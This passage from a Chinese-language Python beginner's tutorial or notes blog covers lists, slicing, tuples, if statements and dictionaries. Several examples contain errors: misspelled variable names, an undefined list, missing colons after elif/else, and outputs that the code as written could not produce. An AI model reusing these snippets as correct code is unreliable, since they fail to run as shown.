<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br><span class="line"></span><br><span class="line">cars.reverse()</span><br><span class="line"><span class="built_in">print</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;subaru&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;bmw&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>使用len()方法列表长度</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cars.py</span></span><br><span class="line">cars = [<span class="string">&#x27;bmw&#x27;</span>,<span class="string">&#x27;audi&#x27;</span>,<span class="string">&#x27;toyota&#x27;</span>,<span class="string">&#x27;subaru&#x27;</span>]</span><br><span class="line"><span class="built_in">len</span>(cars)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure></div></li>
</ol>
</blockquote>
<h3 id="操作列表"><a href="#操作列表" class="headerlink" title="操作列表"></a>操作列表</h3><blockquote>
<ol>
<li>遍历列表</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magicians = [<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;david&#x27;</span>,<span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magiccians:</span><br><span class="line">    <span class="built_in">print</span>(magician)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">alice</span><br><span class="line">david</span><br><span class="line">carolina</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>创建数值列表</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#values.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line"><span class="comment">#for 循环打印1-4的整数，range()方法是左闭右开区间[1,5)</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_list.py</span></span><br><span class="line">numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))<span class="comment">#使用强制转换将数字转换成列表</span></span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,2,3,4,5]</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#even_numbers_list.py</span></span><br><span class="line">even_numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>,<span class="number">2</span>))<span class="comment">#range()方法有3个参数时，第三个参数为步长</span></span><br><span class="line"><span class="built_in">print</span>(even_numbers)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[2,4,6,8,10]</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    square = value ** <span class="number">2</span></span><br><span class="line">    squares.append(square)</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>列表元素统计</li>
</ol>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;digits= [1,2,3,4,5,6,7,8,9,0]</span><br><span class="line">&gt;&gt;&gt;min(digits)</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;max(digits)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt;<span class="built_in">sum</span>(digits)</span><br><span class="line">45</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><strong>列表推导式</strong></li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#square_numbers.py</span></span><br><span class="line">squares=[value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[1,4,9.16,25,36,49,64,81,100]</span><br></pre></td></tr></table></figure></div>

<ol start="5">
<li><p><em><strong>切片(slice)</strong></em></p>
<p>​		创建切片，需要使用第一个元素和最后一个元素的索引，与range()函数一样，Python 在到达指定的第二个索引之前的元素时停止。要输出列表的前三个元素，要指定索引为0和3，将会返回索引分别为0，1，2的元素。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>​					如果需要提取列表的第二、三、四个元素，要指定索引为1和4</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">1</span>:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>​					如若未指定第一个索引，Python将自动从列表开头开始</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;charles&#x27;</span>,martina<span class="string">&#x27;,&#x27;</span>michael<span class="string">&#x27;,&#x27;</span>florence<span class="string">&#x27;]#注意没有到5，则为显示eil</span></span><br></pre></td></tr></table></figure></div>

<p>​					如若未指定结束索引，Python自动遍历至列表尾部</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(players[-<span class="number">3</span>:])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<ol start="6">
<li><p>遍历切片</p>
<p>​		遍历列表中的部分元素，在for循环中使用列表切片。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#players.py</span></span><br><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>,<span class="string">&#x27;martina&#x27;</span>,<span class="string">&#x27;michael&#x27;</span>,<span class="string">&#x27;florence&#x27;</span>,<span class="string">&#x27;eil&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here is the first three player on my team:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> player <span class="keyword">in</span> players[:<span class="number">3</span>]:<span class="comment">#只遍历前三名队员</span></span><br><span class="line">    <span class="built_in">print</span>(player.title())</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Here  is the first three player on my team:</span><br><span class="line">Charles</span><br><span class="line">Martina</span><br><span class="line">Michael</span><br></pre></td></tr></table></figure></div>

<ol start="7">
<li><p>复制列表</p>
<p>​		复制列表，可以创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引([:])。让Python创建一个起始于第一个元素，终止于最后一个元素的切片，即复制整个列表。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#food.py</span></span><br><span class="line">my_foods=[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br><span class="line">friend_foods=my_foods[:]<span class="comment">#[:]不能省略，此时是将my_foods的副本赋给friend_foods。</span></span><br><span class="line"><span class="comment">#如若是friend_foods=my_foods则是将my_foods赋值给friend_foods，两个指向同一个列表。</span></span><br><span class="line"></span><br><span class="line">my_foods.append(<span class="string">&#x27;cannoli&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_foods)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My friend favorite foods are:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(friend_foods)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">My favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>,<span class="string">&#x27;cannoli&#x27;</span>]</span><br><span class="line">My friend favorite foods are:</span><br><span class="line">[<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><blockquote>
<ol>
<li><p><strong>元组定义概念</strong></p>
<p>​		不可变的列表即为元组（tuple)</p>
</li>
<li><p>操作元组</p>
<ul>
<li><p>定义元组</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>​	遍历元组</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions =(<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">200</span><br><span class="line">50</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>修改元组的值</p>
<p>​	元组的元素是无法被修改的，但是可以给表示元组的变量进行赋值，重新定义元组</p>
</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dimensions.py</span></span><br><span class="line">dimensions = (<span class="number">200</span>,<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Orignal dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br><span class="line">                                                                      </span><br><span class="line">dimensions = (<span class="number">400</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nModified dimensions:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal dimensions:</span><br><span class="line">200</span><br><span class="line">50</span><br><span class="line">                                                                      </span><br><span class="line">Modified dimensions:</span><br><span class="line">400</span><br><span class="line">100</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="条件判度if语句"><a href="#条件判度if语句" class="headerlink" title="条件判度if语句"></a>条件判度if语句</h2><h3 id="测试一个条件"><a href="#测试一个条件" class="headerlink" title="测试一个条件"></a>测试一个条件</h3><blockquote>
<p>只适用仅有一个条件满足的情况</p>
</blockquote>
<ul>
<li><p>if语句</p>
<blockquote>
<p>if 条件为true,执行后续程序；条件为false,跳出判断后续代码；</p>
</blockquote>
</li>
<li><p>if-else语句</p>
<blockquote>
<p>if条件为true,执行if后面程序，否则执行else后面程序</p>
</blockquote>
</li>
<li><p>if-elif-else语句</p>
<blockquote>
<p>if 条件为true，执行if后面程序，程序完成跳出条件判断，否则执行elif 判断条件，当条件为true时，执行elif后续程序，程序代码完成跳出判断，否则执行else后面程序代码，执行完成跳出条件判断</p>
</blockquote>
</li>
<li><p>if-elif-elif语句</p>
</li>
</ul>
<h3 id="测试多个条件"><a href="#测试多个条件" class="headerlink" title="测试多个条件"></a>测试多个条件</h3><blockquote>
<p>需要测试多个条件是否满足的情况</p>
</blockquote>
<ul>
<li>if-if-if</li>
</ul>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="概念定义-2"><a href="#概念定义-2" class="headerlink" title="概念定义"></a>概念定义</h3><blockquote>
<p>字典（dictionary)是一系列键值对。每一个键都与值关联，可以使用键来访问相关连的值。在Python中字典用放在花括号“{}”中的一系列键值对来表示的。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#aline.py</span></span><br><span class="line">aline_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(aline_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line">new_points = cline_0[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;You just earned <span class="subst">&#123;new_points&#125;</span> points!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">green</span><br><span class="line">You just earned 5 points!</span><br></pre></td></tr></table></figure></div>

<h3 id="添加键值对"><a href="#添加键值对" class="headerlink" title="添加键值对"></a>添加键值对</h3><blockquote>
<p>字典是一种动态结构，可以随时在其中添加键值对。需要依次指定字典名，用方括号括起来的键和键关联的值。字典会保留定义是的元素排列顺序。</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">0</span></span><br><span class="line">alien_0[<span class="string">&#x27;y_position&#x27;</span>] = <span class="number">25</span></span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:5,<span class="string">&#x27;x_position&#x27;</span>:0,<span class="string">&#x27;y_position&#x27;</span>:25&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果需要使用字典来存储用户提供的数据或编写能自动生成大量键值对的代码，通常先创建一个空字典。</p>
</blockquote>
<h3 id="修改字典中的值"><a href="#修改字典中的值" class="headerlink" title="修改字典中的值"></a>修改字典中的值</h3><blockquote>
<p> 要修改字典中的值，可一次指定字典中的键名，用方括号括起来的键和键关联的新值</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;x_position&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;y_position&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Orignal position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;slow&#x27;</span>:</span><br><span class="line">	x_increment = <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> alien_0[<span class="string">&#x27;speed&#x27;</span>] == <span class="string">&#x27;medium&#x27;</span></span><br><span class="line">	x_increment = <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	x_increment = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">alien_0[<span class="string">&#x27;x_position&#x27;</span>] = x_increment + alien_0[<span class="string">&#x27;x_position&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Now position:<span class="subst">&#123;alien_0[<span class="string">&#x27;x_position&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Orignal position:0</span><br><span class="line">Now position:2</span><br></pre></td></tr></table></figure></div>

<h3 id="删除键值对-del语句"><a href="#删除键值对-del语句" class="headerlink" title="删除键值对(del语句)"></a>删除键值对(del语句)</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;position&#x27;</span>:<span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(alien_0)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;position&#x27;</span>:5&#125;</span><br><span class="line">&#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>&#125;<span class="comment">#删除后将永久消失</span></span><br></pre></td></tr></table></figure></div>

<h3 id="使用get-访问值"><a href="#使用get-访问值" class="headerlink" title="使用get()访问值"></a>使用get()访问值</h3><p>使用方括号里的键从字典中获取感兴趣的值，可能会引发问题：当指定的键不存在，则会出现错误。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien.py</span></span><br><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;speed&#x27;</span>:<span class="string">&#x27;slow&#x27;</span>&#125;</span><br><span class="line">print_value = alien_0.get(<span class="string">&#x27;points&#x27;</span>,<span class="string">&#x27;No point value assigned.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(print_value)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>如果字典中有键’points’，则获取键关联的值，否则将获取指定的默认值。</p>
<p>在调用get()函数时，如果没有指定第二个参数且指定的键不存在，则Python将放回None。</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">No point value asigned.</span><br></pre></td></tr></table></figure></div>

<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><ol>
<li><strong>遍历所有的键值对</strong></li>
</ol>
<p>利用for 循环，借用两个变量分别保存键名和值，items()返回键-值对列表</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user.pu</span></span><br><span class="line">user_0 =&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;efermi&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>:<span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>:<span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n key:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n value:<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">key: last</span><br><span class="line">Value: fermi</span><br><span class="line">Key: first</span><br><span class="line">Value: enrico</span><br><span class="line">Key: username</span><br><span class="line">Value: efermi</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意，即便遍历字典时，键—值对的返回顺序也与存储顺序不同。Python不关心键—值对的存<br>储顺序，而只跟踪键和值之间的关联关系。</p>
</blockquote>
<ol start="2">
<li><strong>遍历所有的键</strong></li>
</ol>
<blockquote>
<p>利用for 循环，用一个变量保存字典的键名，keys()</p>
</blockquote>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br><span class="line">	<span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>提取字典favorite_languages中的所有键，并依次将它们存储到变量name中。输出列出了每个被调查者的名字：</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Phil</span><br><span class="line">Edward</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>遍历字典时，会默认遍历所有的键.</p>
<p>因此，如果将上述代码中的for name in favorite_languages.keys():替换为for name in favorite_languages:，输出将不变。</p>
</blockquote>
<ul>
<li><p>按顺序遍历字典中的所有键</p>
<p>字典总是明确地记录键和值之间的关联关系，但获取字典的元素时，获取顺序是不可预测的。</p>
<p>要以特定的顺序返回元素，一种办法是在for循环中对返回的键进行排序。为此，可使用函<br>数sorted()来获得按特定顺序排列的键列表的副本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#favorite_languages.py</span></span><br><span class="line">favorite_languages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">sorted</span>(favorite_languages.keys()):</span><br><span class="line">	<span class="built_in">print</span>(name.title() + <span class="string">&quot;, thank you for taking the poll.&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>dictionary.keys()的结果调用了函数sorted()。这让Python列出字典中的所有键，并在遍历前对这个列表进行排序。输出表明，按顺序显示了所有被调查者的名字：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Edward, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Jen, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Phil, thank you <span class="keyword">for</span> taking the poll.</span><br><span class="line">Sarah, thank you <span class="keyword">for</span> taking the poll.</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="遍历字典中的所有值"><a href="#遍历字典中的所有值" class="headerlink" title="遍历字典中的所有值"></a>遍历字典中的所有值</h3><p>利用for循环，用一个变量存储字典的值，values();set()集合，剔除重复项。</p>
